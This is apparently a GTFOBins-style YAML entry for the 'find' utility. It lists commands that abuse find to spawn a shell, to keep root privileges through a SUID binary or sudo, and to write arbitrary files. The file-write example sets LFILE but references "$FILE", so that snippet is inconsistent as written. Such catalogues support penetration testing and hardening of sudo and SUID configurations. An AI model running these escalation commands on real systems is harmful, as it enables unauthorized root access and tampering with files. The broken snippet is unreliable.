---
functions:
  shell:
    - code: find . -exec /bin/sh \; -quit
  suid:
    - code: ./find . -exec /bin/sh -p \; -quit
  sudo:
    - code: sudo find . -exec /bin/sh \; -quit
  file-write:
    - description: DATA is a format string, it supports some escape sequences.
      code: |
        LFILE=file_to_write
        find / -fprintf "$FILE" DATA -quit
---
